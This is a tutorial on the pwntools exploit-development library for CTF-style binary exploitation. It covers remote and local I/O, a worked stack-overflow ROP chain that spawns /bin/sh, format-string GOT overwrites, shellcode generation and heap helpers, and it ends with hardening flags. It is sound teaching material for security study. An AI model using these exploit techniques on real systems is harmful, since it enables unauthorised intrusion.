# pwntools — full tutorial

`pwntools` is the de-facto Python CTF / exploit-development library. Wraps everything you do during binary exploitation: connect to remote, send/recv with packing, build ROP chains, generate shellcode, do format-string offsets, attach gdb, manipulate ELFs.

## Install

```terminal
pip install pwntools
# Optional but very useful:
pip install ropper        # ROP gadget search
sudo apt install gdb gdb-multiarch ltrace strace
```

## Imports / basics

```python
from pwn import *

context.update(arch='amd64', os='linux', log_level='info')

# remote
io = remote('chal.example.com', 1337)

# local
io = process('./vuln')

# attach gdb (in tmux)
io = process('./vuln'); gdb.attach(io, '''
b *main+50
c
''')

# send / recv
io.sendline(b'AAAA')
data = io.recv(1024)
data = io.recvline()
data = io.recvuntil(b'>')
io.sendlineafter(b'>', payload)
io.interactive()              # drop into manual mode
```

## Common helpers

| Helper | Purpose |
|--------|---------|
| `cyclic(N)` | de Bruijn pattern (find offset) |
| `cyclic_find(b'caaa')` | offset → integer |
| `p64(x)` / `p32(x)` / `p16(x)` / `p8(x)` | Pack to little-endian |
| `u64(b'\x00...')` / `u32(...)` | Unpack |
| `flat(...)` | Pack multiple values, with named padding |
| `asm('mov rax, 1; ret')` | Assemble |
| `disasm(b'\x48\x31\xc0')` | Disassemble |
| `shellcraft.amd64.linux.sh()` | Generate shellcode |
| `ELF('./vuln')` | Parse ELF (`e.symbols['main']`, `e.got['printf']`, `e.plt['system']`) |
| `ROP(elf)` | Build a ROP chain |
| `process.libs()` | Map libraries to bases |
| `log.info('...')` / `log.success('...')` | Pretty output |

## Worked example — basic stack overflow

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
e = ELF('./vuln')
io = process('./vuln')

# 1. Find offset to RIP via cyclic
# io.sendline(cyclic(200)); core = io.corefile  # then cyclic_find(core.fault_addr)
offset = 72

# 2. Build ROP: gadgets via ROPper or pwntools
rop = ROP(e)
rop.raw(rop.find_gadget(['ret']))     # stack alignment
rop.system(next(e.search(b'/bin/sh')))

payload = b'A' * offset + rop.chain()

io.sendline(payload)
io.interactive()
```

## Format string

```python
# Compute the index, leak canary
io.sendline(f"%{idx}$lx".encode())
canary = int(io.recvline().strip(), 16)

# Write arbitrary value with %n
fmt = fmtstr_payload(offset=6, writes={got['exit']: shellcode_addr})
io.sendline(fmt)
```

`fmtstr_payload` does the heavy lifting (computes the offsets, prefix length, ordering).

## Heap helpers

```python
def malloc(size, data=b''):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size?', str(size).encode())
    io.sendafter(b'data?', data)

def free(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx?', str(idx).encode())
```

Wrap protocol once, then attack abstractly.

## Useful subcommands (pwn cli)

```terminal
pwn checksec ./vuln                  # NX/PIE/RELRO/Canary
pwn cyclic 200                       # de Bruijn
pwn cyclic --lookup 0x6161616c       # find offset
pwn shellcraft -f d amd64.linux.sh    # dump asm
pwn shellcraft -f e amd64.linux.sh    # dump elf
pwn debug ./vuln                     # convenient run+gdb
pwn template ./vuln                  # boilerplate exploit script
pwn unhex 'hexstring'
pwn elfdiff a.out b.out
```

## Tubes / I/O

```python
io = remote('host', 1337)
io = ssh('user', 'host', password='pwn').process('./vuln')
io = listen(1337)         # bind to port (callbacks)
io = serial('/dev/ttyUSB0')

# IO modes
io.recv(timeout=2)
io.recvline_contains(b'flag')
io.recvuntil(b'>')
io.send(b'...')
io.close()
```

## Bad output / fixes

| Symptom | Fix |
|---------|-----|
| `EOFError` after sending | Server crashed (good — found a bug); check stderr / coredump |
| `recv` hangs | Wrong delimiter; use `recvuntil` with the right prompt |
| `cyclic_find` returns -1 | Pattern length wrong; bump cyclic len |
| ROP chain returns to garbage | `ret`-aligned (movaps fault) — add a single `ret` gadget for alignment |
| Different libc on remote | Use `LIBC_VERSIONS_BY_BUILD_ID` (`libc-database`); patchelf to load matching libc locally |

## Defender perspective

You don't run pwntools defensively, but knowing what attackers reach for shapes hardening:

- **NX**, **stack canaries**, **ASLR/PIE**, **Full RELRO**, **CFI**, **shadow stacks** all increase pwntools-exploitation cost.
- Compiler-time `-D_FORTIFY_SOURCE=2`, `-fstack-protector-strong`, `-Wl,-z,now -Wl,-z,relro`, `-fpie -fpic` should be defaults.

## Related tools

| Tool | Niche |
|------|-------|
| **ropper** | ROP/JOP gadget search |
| **ROPgadget** | Older alternative |
| **angr** | Symbolic execution / automated exploit |
| **GDB + GEF / pwndbg / peda** | Augmented gdb |
| **libc-database** | Find libc version from leaked addresses |
| **one_gadget** | Find magic ret-to-libc gadgets in libc |
| **patchelf** | Override interpreter / RPATH for testing |
